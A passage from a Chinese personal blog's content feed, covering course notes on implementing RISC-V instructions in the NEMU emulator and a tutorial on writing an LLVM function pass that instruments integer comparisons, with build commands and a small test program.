href="http://anya.cool/archives/81c5e64f.html">地址</a>。因此就按照这个改了。在volumn(1)156页也能找到。这个volumn1和volumn2应该就是指一个是user模式下，另一个是privileged模式。</p><p>addi的描述是下面这样的</p><p><img src="/2022/12/27/ics-pa1/image-20230102145930587.png" alt="image-20230102145930587"></p><p><img src="/2022/12/27/ics-pa1/QQ%E5%9B%BE%E7%89%8720220821230349.png" alt="QQ图片20220821230349"></p><h3 id="li指令"><a href="#li指令" class="headerlink" title="li指令"></a>li指令</h3><p>这个指令上面查不到。在手册中查到如下。</p><p><img src="/2022/12/27/ics-pa1/image-20230102153700232.png" alt="image-20230102153700232"></p><p>参考：cheetsheet:<a href="https://itnext.io/risc-v-instruction-set-cheatsheet-70961b4bbe8">https://itnext.io/risc-v-instruction-set-cheatsheet-70961b4bbe8</a></p><p>同样的cheetsheet <a href="https://mark.theis.site/riscv/">https://mark.theis.site/riscv/</a></p><p>发现真的是查不到这个指令。没办法，跟着网上博主的做法，实现了一个和addi一样的。</p><h3 id="auipc"><a href="#auipc" class="headerlink" title="auipc"></a>auipc</h3><p>太nb了这个makefile，竟然能显示宏不展开的源文件，一定要研究一下，之前搞了好久。</p><p><img src="/2022/12/27/ics-pa1/image-20230102163648907.png" alt="image-20230102163648907"></p><p><img src="/2022/12/27/ics-pa1/image-20230102163948116.png" alt="image-20230102163948116"></p><h3 id="jal"><a href="#jal" class="headerlink" title="jal"></a>jal</h3><p><img src="/2022/12/27/ics-pa1/image-20230102192320315.png" alt="image-20230102192320315"></p><p>同时，J也是这样的行为</p><p><img src="/2022/12/27/ics-pa1/image-20230103123759768.png" alt="image-20230103123759768"></p><h3 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h3><p><img src="/2022/12/27/ics-pa1/image-20230102223445959.png" alt="image-20230102223445959"></p><h3 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h3><p>还是不知道哪里能看伪指令。ret也是伪指令。</p><p><img src="/2022/12/27/ics-pa1/image-20230102224520084.png" alt="image-20230102224520084"></p><p><img src="/2022/12/27/ics-pa1/image-20230102224458958.png" alt="image-20230102224458958"></p><h3 id="beq等条件跳转"><a href="#beq等条件跳转" class="headerlink" title="beq等条件跳转"></a>beq等条件跳转</h3><p><img src="/2022/12/27/ics-pa1/image-20230103101241210.png" alt="image-20230103101241210"></p><p><img src="/2022/12/27/ics-pa1/image-20230103102448659.png" alt="image-20230103102448659"></p><p><img src="/2022/12/27/ics-pa1/image-20230103213239171.png" alt="image-20230103213239171"></p><h3 id="add等"><a href="#add等" class="headerlink" title="add等"></a>add等</h3><p><img src="/2022/12/27/ics-pa1/image-20230103104955564.png" alt="image-20230103104955564"></p><p><img src="/2022/12/27/ics-pa1/image-20230103105009618.png" alt="image-20230103105009618"></p><p><img src="/2022/12/27/ics-pa1/image-20230103105138704.png" alt="image-20230103105138704"></p><h3 id="mul等"><a href="#mul等" class="headerlink" title="mul等"></a>mul等</h3><p><img src="/2022/12/27/ics-pa1/image-20230103144034176.png" alt="image-20230103144034176"></p><p><img src="/2022/12/27/ics-pa1/image-20230103143957615.png" alt="image-20230103143957615"></p><p><img src="/2022/12/27/ics-pa1/image-20230103154540106.png" alt="image-20230103154540106"></p><p><img src="/2022/12/27/ics-pa1/image-20230103143925722.png" alt="image-20230103143925722"></p><h3 id="slti"><a href="#slti" class="headerlink" title="slti"></a>slti</h3><p><img src="/2022/12/27/ics-pa1/image-20230103124827286.png" alt="image-20230103124827286"></p><h3 id="store相关"><a href="#store相关" class="headerlink" title="store相关"></a>store相关</h3><p><img src="/2022/12/27/ics-pa1/image-20230103130557076.png" alt="image-20230103130557076"></p><h3 id="load相关"><a href="#load相关" class="headerlink" title="load相关"></a>load相关</h3><p><img src="/2022/12/27/ics-pa1/image-20230103131257231.png" alt="image-20230103131257231"></p><h3 id="slli"><a href="#slli" class="headerlink" title="slli"></a>slli</h3><p><img src="/2022/12/27/ics-pa1/image-20230103133159507.png" alt="image-20230103133159507"></p><h3 id="andi"><a href="#andi" class="headerlink" title="andi"></a>andi</h3><p><img src="/2022/12/27/ics-pa1/image-20230103211342559.png" alt="image-20230103211342559"></p><p><img src="/2022/12/27/ics-pa1/image-20230103211746944.png" alt="image-20230103211746944"></p><h3 id="p155开始是指令集"><a href="#p155开始是指令集" class="headerlink" title="p155开始是指令集"></a>p155开始是指令集</h3><h3 id="rem"><a href="#rem" class="headerlink" title="rem"></a>rem</h3><p>这个看起来比较麻烦啊，是什么余数，其实就是mod</p><p><img src="/2022/12/27/ics-pa1/image-20230103212626030.png" alt="image-20230103212626030"></p><p><img src="/2022/12/27/ics-pa1/image-20230103212554682.png" alt="image-20230103212554682"></p><p><img src="/2022/12/27/ics-pa1/image-20230103212506910.png" alt="image-20230103212506910"></p><h3 id="sra"><a href="#sra" class="headerlink" title="sra"></a>sra</h3><p>手酸</p><p><img src="/2022/12/27/ics-pa1/image-20230103221630781.png" alt="image-20230103221630781"></p><p><img src="/2022/12/27/ics-pa1/image-20230103221616485.png" alt="image-20230103221616485"></p><h3 id="string-和hello-string不用测"><a href="#string-和hello-string不用测" class="headerlink" title="string 和hello string不用测"></a>string 和hello string不用测</h3><p>由于<code>string</code>和<code>hello-str</code>还需要实现额外的内容才能运行(具体在后续小节介绍), 目前可以先使用其它测试用例进行测试.</p><h2 id="学习makefile"><a href="#学习makefile" class="headerlink" title="学习makefile"></a>学习makefile</h2><p>在monitor.c里面看到有一个batch模式，加上-b即可。于是修改home/nicholas/Desktop/ics-pa/abstract-machine/scripts/platform/nemu.mk(在/home/nicholas/Desktop/ics-pa/abstract-machine/Makefile里面用到了)，在args里面加上-b。亲测可以</p><p><img src="/2022/12/27/ics-pa1/image-20230104152223300.png" alt="image-20230104152223300"></p><h2 id="gcc的所有参数"><a href="#gcc的所有参数" class="headerlink" title="gcc的所有参数"></a>gcc的所有参数</h2><p>我个人觉得，RTFM是一种方法，但是碰到GNU的manual，还是算了。这是mit的</p><p><a href="https://web.mit.edu/rhel-doc/3/rhel-gcc-en-3/invoking-gcc.html">https://web.mit.edu/rhel-doc/3/rhel-gcc-en-3/invoking-gcc.html</a></p><h3 id="添加ringbuf"><a href="#添加ringbuf" class="headerlink" title="添加ringbuf"></a>添加ringbuf</h3><p>在nemu/src/memory中，有一个out_of_memory函数，感觉在这里添加比较靠谱。同时需要查看一下<code>nemu/src/utils/disasm.cc</code>。</p><p>还要参考一下<code>exec_once</code>里面对于disassemble的调用</p><p><img src="/2022/12/27/ics-pa1/image-20230111105248845.png" alt="image-20230111105248845"></p><p>截止2023-1-4完成到PA2的一半，暂缓</p>]]></content>
      
      
      <categories>
          
          <category> system </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ics-pa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>llvm-pass1</title>
      <link href="/2022/11/13/llvm-pass1/"/>
      <url>/2022/11/13/llvm-pass1/</url>
      
        <content type="html"><![CDATA[<p>开始复现CAFL工具，工具原文和笔记在<a href="https://nicholas-wei.github.io/2022/08/13/Constraint-guided-Directed-Greybox-Fuzzing/">链接</a>。这一周着手写了一个对于compare条件之前，提取操作数并转发的简单(其实我觉得写起来查资料超级麻烦的)pass</p><span id="more"></span><h1 id="关于llvm-pass基础知识有用网站"><a href="#关于llvm-pass基础知识有用网站" class="headerlink" title="关于llvm-pass基础知识有用网站"></a>关于llvm-pass基础知识有用网站</h1><p>经过吐血搜索，最后找到集中比较有用的。不得不说，llvm的文档实在是太不友好了，查一个什么类直接告诉你reference，一点解释都没有，直接告诉你源码位置。如下图</p><p><img src="/2022/11/13/llvm-pass1/image-20221113113525154.png" alt="image-20221113113525154"></p><p>我就想说，不想写文档就不要写，还搞个自动生成的文档。。</p><p>不过还是有一些部分是有用的，比如说这些</p><ul><li>学习llvm ir的c++api最好的开始的地方：<a href="https://llvm.org/docs/ProgrammersManual.html">https://llvm.org/docs/ProgrammersManual.html</a></li><li>学习llvm基础知识：<a href="https://llvm.org/docs/LangRef.html">https://llvm.org/docs/LangRef.html</a></li><li>特别详细的入门llvm ir c++ api的例子：<a href="https://blog.csdn.net/Zhanglin_Wu/article/details/125289502">https://blog.csdn.net/Zhanglin_Wu/article/details/125289502</a></li><li>国外的编译器优化教程，会从零基础讲llvm pass如何编写<ul><li>课程网址：<a href="http://www.cs.toronto.edu/~pekhimenko/courses/cscd70-w20/content.html">http://www.cs.toronto.edu/~pekhimenko/courses/cscd70-w20/content.html</a></li><li>课程视频：<a href="https://www.youtube.com/watch?v=Ml-4hkFQcnE&amp;list=PL0qj8UdnOw30ZGMcM6DwvM1J2tttyy_D6&amp;index=3">https://www.youtube.com/watch?v=Ml-4hkFQcnE&amp;list=PL0qj8UdnOw30ZGMcM6DwvM1J2tttyy_D6&amp;index=3</a></li><li>课程github : <a href="https://github.com/UofT-EcoSystem/CSCD70">https://github.com/UofT-EcoSystem/CSCD70</a></li></ul></li></ul><p>此外就是stackoverflow了，很多问题的解决办法都是在这上面找的。一定要google搜索相关问题。</p><p>此外还需要感谢肖浩宇学长，帮我解决了很多pass实现上的问题</p><h1 id="instrument-value-pass"><a href="#instrument-value-pass" class="headerlink" title="instrument value pass"></a>instrument value pass</h1><p>这一部分关于我如何编写一个简单的，获取cmp比较的两个操作数的内容，并转发的pass。首先，我选择的是function pass。关于为什么选择了这个pass，是因为我懒得改模板了。(其实是我觉得Function Pass也能完成任务，不知道和Module Pass的区别主要在哪里呜呜</p><p>写一个pass，需要一些prelogue，基本就是声明一个类，然后重载runOnFunction函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">MyPlacementPass</span> : <span class="keyword">public</span> FunctionPass</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">static</span> <span class="type">char</span> ID;</span><br><span class="line">  <span class="built_in">MyPlacementPass</span>() : <span class="built_in">FunctionPass</span>(ID)&#123;&#125;</span><br><span class="line">  FunctionCallee monitor;</span><br><span class="line">    </span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br></pre></td></tr></table></figure><p>在<code>runOnFunction</code>内部，我们编写的所有内容都可以作用到<strong>每一个函数</strong>中，而我所想要做的，就是<strong>遍历每一个basic block、遍历每一个instruction、寻找到cmp、提取操作数、插装计算并转发</strong>。</p><h2 id="遍历每一个Basic-Block"><a href="#遍历每一个Basic-Block" class="headerlink" title="遍历每一个Basic Block"></a>遍历每一个Basic Block</h2><p>通过runOnFunction，对于每一个函数做如下操作。首先我打印了一句话，接着我找到一个函数，这个是我暂时用来转发变量的函数(实际复现中可能也需要这样的函数，因为用IR写并且转发似乎没有必要)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">runOnFunction</span><span class="params">(Function &amp;F)</span> <span class="keyword">override</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;------------- runOnFunction --------------\n&quot;</span>);</span><br><span class="line">  DebugInfoFinder Finder;</span><br><span class="line">  Finder.<span class="built_in">processModule</span>(*(F.<span class="built_in">getParent</span>()));</span><br><span class="line">  <span class="comment">// not instrument before show_var function</span></span><br><span class="line">  <span class="keyword">if</span> (F.<span class="built_in">getName</span>().<span class="built_in">startswith</span>(<span class="string">&quot;show_var&quot;</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;find show var&quot;</span>&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="comment">// monitor = dyn_cast&lt;FunctionCallee&gt;(F);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>接着就是遍历每一个basic block并获取每一个指令了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">LLVMContext &amp;context = F.<span class="built_in">getParent</span>()-&gt;<span class="built_in">getContext</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (Function::iterator I = F.<span class="built_in">begin</span>(), E = F.<span class="built_in">end</span>(); I != E; ++I)</span><br><span class="line">&#123;</span><br><span class="line">    BasicBlock &amp;BB = *I;</span><br><span class="line">    FunctionType *type = FunctionType::<span class="built_in">get</span>(Type::<span class="built_in">getVoidTy</span>(context),&#123;Type::<span class="built_in">getInt32Ty</span>(context)&#125;,<span class="literal">false</span>);</span><br><span class="line">    FunctionCallee sendFunc = BB.<span class="built_in">getModule</span>()-&gt;<span class="built_in">getOrInsertFunction</span>(<span class="string">&quot;send_mem&quot;</span>,type);</span><br><span class="line">    Value *zero = ConstantInt::<span class="built_in">get</span>(Type::<span class="built_in">getInt32Ty</span>(context),<span class="number">0</span>);</span><br><span class="line">    Value *one = ConstantInt::<span class="built_in">get</span>(Type::<span class="built_in">getInt32Ty</span>(context),<span class="number">1</span>);</span><br><span class="line">    CallInst * inst;</span><br><span class="line">    <span class="keyword">for</span> (BasicBlock::iterator I = BB.<span class="built_in">begin</span>(), E = BB.<span class="built_in">end</span>(); I != E; ++I)</span><br><span class="line">    &#123;</span><br></pre></td></tr></table></figure><p>在llvm中，有一些很有用的API，比如Function，BasicBlock的iterator。这些迭代器能够帮助我们遍历整个程序，并对他们做修改。上图中我们首先建立了一个<code>Function::iterator I</code>（实际上是BasicBlock）接着在程序上下文中找到了一个函数，和上面的show_var是一样的。接着建立<code>BasicBlock::iterator I</code>(其实就是Instruction*)。</p><h2 id="寻找到cmp"><a href="#寻找到cmp" class="headerlink" title="寻找到cmp"></a>寻找到cmp</h2><p>如下，直接用instruction-&gt;getOpcode()就可以了，如果Opcode是<code>Instruction::ICmp</code>，就可以直接拿出来，作为比较的指令。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IRBuilder&lt;&gt; <span class="built_in">Builder</span>(I-&gt;<span class="built_in">getContext</span>());</span><br><span class="line">std::vector&lt;Value*&gt; args;</span><br><span class="line"><span class="keyword">if</span>(I-&gt;<span class="built_in">getOpcode</span>() == Instruction::ICmp)&#123;</span><br><span class="line">    <span class="comment">// we do instrument here</span></span><br><span class="line">    <span class="built_in">LLVM_DEBUG</span>(<span class="built_in">dbgs</span>() &lt;&lt; <span class="string">&quot;found cmp\n&quot;</span>);</span><br><span class="line">    ICmpInst *cmp = <span class="built_in">dyn_cast</span>&lt;ICmpInst&gt;(I);</span><br><span class="line">    <span class="type">int</span> cmp_operand = cmp-&gt;<span class="built_in">getPredicate</span>(); </span><br></pre></td></tr></table></figure><h3 id="提取比较类型"><a href="#提取比较类型" class="headerlink" title="提取比较类型"></a>提取比较类型</h3><p>比方说比较用的是”&gt;”,  “&lt;”,  “==“这样的，我们该怎么提取呢？直接用getPredicate即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> cmp_operand = cmp-&gt;<span class="built_in">getPredicate</span>(); </span><br><span class="line"><span class="type">long</span> distance = <span class="number">0</span>; <span class="comment">// distance of variables</span></span><br><span class="line"><span class="keyword">switch</span> (cmp_operand)&#123;</span><br></pre></td></tr></table></figure><p>Opcode类型也可以从<a href="https://llvm.org/doxygen/classllvm_1_1CmpInst.html#a283f9a5d4d843d20c40bb4d3e364bb05">网站</a>中找到。因此我们的代码框架可以是</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (cmp_operand)&#123;</span><br><span class="line">    <span class="keyword">case</span> CmpInst::ICMP_EQ:&#123;</span><br><span class="line">        &#123;...&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> ICmpInst::ICMP_SGE:&#123;</span><br><span class="line">        &#123;...&#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><h2 id="插桩转发"><a href="#插桩转发" class="headerlink" title="插桩转发"></a>插桩转发</h2><p>这一部分是我经过的坑最多的地方！首先是我们要明白，变量的值都是动态产生的，因此我们必须把代码嵌入到LLVM ir中，不能用pass直接分析。那么我们要做的事情就有</p><ul><li>动态获取变量的值</li><li>插入计算语句</li><li>获取计算语句的结果</li><li>将结果转发给已经写好的函数</li></ul><p>我们一步一步来</p><h3 id="详细流程"><a href="#详细流程" class="headerlink" title="详细流程"></a>详细流程</h3><p>下面用大于等于为例说明。</p><p>首先我们建立一个Builder，Builder初始化的语句为</p><p><code>IRBuilder&lt;&gt; Builder(I-&gt;getContext());</code></p><p>这里的context是什么意思？在<a href="https://stackoverflow.com/questions/13184835/what-is-llvm-context">stackoverflow</a>里面可以找到这样的描述</p><blockquote><p>This is an important class for using LLVM in a threaded context. It  (opaquely) owns and manages the core “global” data of LLVM’s core  infrastructure, including the type and constant uniquing tables.</p></blockquote><p>也就是我们可以近似的理解为llvm的一种engine吧。</p><p>在初始化Builder之后，我们首先要设置当前builder得到的ir插入位置。也就是第一句<code>SetInsertPoint()</code>。</p><p>接下来我们创建两个cmp的operand的减法。由于是大于等于，我们直接让第二个参数减去第一个，如果小于0就说明已经满足了，否则就是不满足，并将差距表示出来。</p><p><code>Value* sub_result = Builder.CreateSub(cmp-&gt;getOperand(1),cmp-&gt;getOperand(0));</code></p><p>接下来建立一个cmp和select语句的结合。这两个语句可以简单产生一个<code>max()</code>而不用新建basic block。参考的网站主要是<a href="https://mapping-high-level-constructs-to-llvm-ir.readthedocs.io/en/latest/control-structures/if-then-else.html">select表示max和min</a>。</p><p>接下来只需要调用在C中的函数就可以了。首先准备参数，下面的args的原型为</p><p><code>std::vector&lt;Value*&gt; args;</code></p><p>我们先把他清空，之后push进去相应的函数参数即可。那么怎么找到源文件中的转发函数呢？其实在上面遍历每一个basic block的时候就已经提到过。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ICmpInst::ICMP_SGE:&#123;</span><br><span class="line">    <span class="comment">// n1 &gt;= n2</span></span><br><span class="line">    <span class="comment">// if (n1 - n2 &gt; 0), return 0</span></span><br><span class="line">    <span class="comment">// else return n1 - n2</span></span><br><span class="line">    Builder.<span class="built_in">SetInsertPoint</span>(cmp);</span><br><span class="line">    Value* sub_result = Builder.<span class="built_in">CreateSub</span>(cmp-&gt;<span class="built_in">getOperand</span>(<span class="number">1</span>),cmp-&gt;<span class="built_in">getOperand</span>(<span class="number">0</span>)); <span class="comment">// hot to esure it&#x27;s signed?</span></span><br><span class="line">    Value* cmp_result = Builder.<span class="built_in">CreateICmp</span>(ICmpInst::ICMP_SGT, sub_result,zero);</span><br><span class="line">    Value* maxnum = Builder.<span class="built_in">CreateSelect</span>(cmp_result,sub_result,zero);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// give to send_num()</span></span><br><span class="line"></span><br><span class="line">    args.<span class="built_in">clear</span>();</span><br><span class="line">    args.<span class="built_in">push_back</span>(maxnum);</span><br><span class="line">    inst = CallInst::<span class="built_in">Create</span>(sendFunc,args);</span><br><span class="line">    inst-&gt;<span class="built_in">insertBefore</span>(cmp);</span><br><span class="line">    <span class="built_in">errs</span>()&lt;&lt;<span class="string">&quot;instrument for &gt;=(SGE) ok.&quot;</span>&lt;&lt;<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到此，一个简单的针对大于符号的pass就写好了。在此基础上可以写基于别的符号的pass。</p><h1 id="编译和测试"><a href="#编译和测试" class="headerlink" title="编译和测试"></a>编译和测试</h1><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>用到的所有编译指令如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">generate a pass</span></span><br><span class="line">clang `llvm-config --cxxflags` -Wl,-znodelete -fno-rtti -fPIC -shared ./instrument_printVar.cpp -o inst_var.so `llvm-config --ldflags`</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">generate bc file</span></span><br><span class="line">clang++ -emit-llvm -c -g test_clang.cpp -o test_clang.bc</span><br><span class="line">llvm-dis ./change_clang.bc -o=change_clang_dis.ll</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">use a pass</span></span><br><span class="line">opt -load ./output_func.so -function-info ./test_clang.bc -o /dev/null</span><br><span class="line">opt -load ./inst_var.so -var ./test_clang.bc -o ./change_clang.bc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">get .o file</span> </span><br><span class="line">llc -filetype=obj ./change_clang.bc</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">compile to binary</span></span><br><span class="line">clang++ ./change_clang.o -o change_clang</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">extern issue</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://stackoverflow.com/questions/29903416/how-to-call-function-in-llvm</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>流程一般是这样</p><ol><li>用clang编译pass和源文件，生成pass.so和bc文件</li><li>用opt加载pass，从而对bc进行插桩修改</li><li>从bc获取.o文件</li><li>将.o文件链接成最终可执行文件</li></ol><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>用下面的源文件进行测试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> <span class="title function_">show_var</span><span class="params">(<span class="type">long</span> num)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;value content is %ld\n&quot;</span>, num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> <span class="title function_">send_mem</span><span class="params">(<span class="type">int</span> num)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Value to be send is %d. \n&quot;</span>,num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// static void show_var(long num)&#123;</span></span><br><span class="line"><span class="comment">//     printf(&quot;value content is %ld\n&quot;, num);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// not equal. we should send 1</span></span><br><span class="line">    <span class="keyword">if</span>(a != <span class="number">20</span>)&#123;</span><br><span class="line">        b ++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// false. we should send (20-10)=10</span></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="keyword">if</span>(a &gt;= <span class="number">20</span>)&#123;</span><br><span class="line">        b++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// True. we should send 0</span></span><br><span class="line">    <span class="keyword">if</span>(a &lt;= <span class="number">20</span>)&#123;</span><br><span class="line">        b++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// false. we should send |10-20| = 10, but now I send -10</span></span><br><span class="line">    <span class="keyword">if</span>(a == <span class="number">20</span>)&#123;</span><br><span class="line">        b++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终成功在ir上面插桩，得到如下文件(下面是部分截图)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%13 = load i32, i32* %2, align 4</span><br><span class="line">%14 = sub i32 20, %13</span><br><span class="line">%15 = icmp sgt i32 %14, 0</span><br><span class="line">%16 = select i1 %15, i32 %14, i32 0</span><br><span class="line">call void @send_mem(i32 %16)</span><br><span class="line">%17 = icmp sge i32 %13, 20</span><br><span class="line">br i1 %17, label %18, label %21</span><br></pre></td></tr></table></figure><p>执行的结果如下，成功~(最后花了快两天时间呜呜呜)</p><p><img src="/2022/11/13/llvm-pass1/image-20221113140228527.png" alt="image-20221113140228527"></p><h1 id="碰到的问题和解决措施"><a href="#碰到的问题和解决措施" class="headerlink" title="碰到的问题和解决措施"></a>碰到的问题和解决措施</h1><p>在执行过程中碰到了很多问题。这也是第一次自己写一个pass</p><h2 id="seg-fault"><a href="#seg-fault" class="headerlink" title="seg fault"></a>seg fault</h2><p>这是最常见的错误了，类似下图</p><p><img src="/2022/11/13/llvm-pass1/image-20221113140409166.png" alt="image-20221113140409166"></p><p>一般原因是：函数参数不匹配/插入的语句不在basic block中（这些是有原因会告诉你的，比方上面这张图，就是broken module found）</p><p><strong>但是有一些报错，根本不会告诉你原因！</strong></p><p>后来才知道，这种情况大部分因为<strong>没有检查API返回内容是否是NULL,从而使用了空指针</strong></p><p>比方说下面修改后的内容，加上了if/else来检查。如果不检查就有可能出现空指针引用的问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">I-&gt;<span class="built_in">getModule</span>()-&gt;<span class="built_in">getOrInsertGlobal</span>(<span 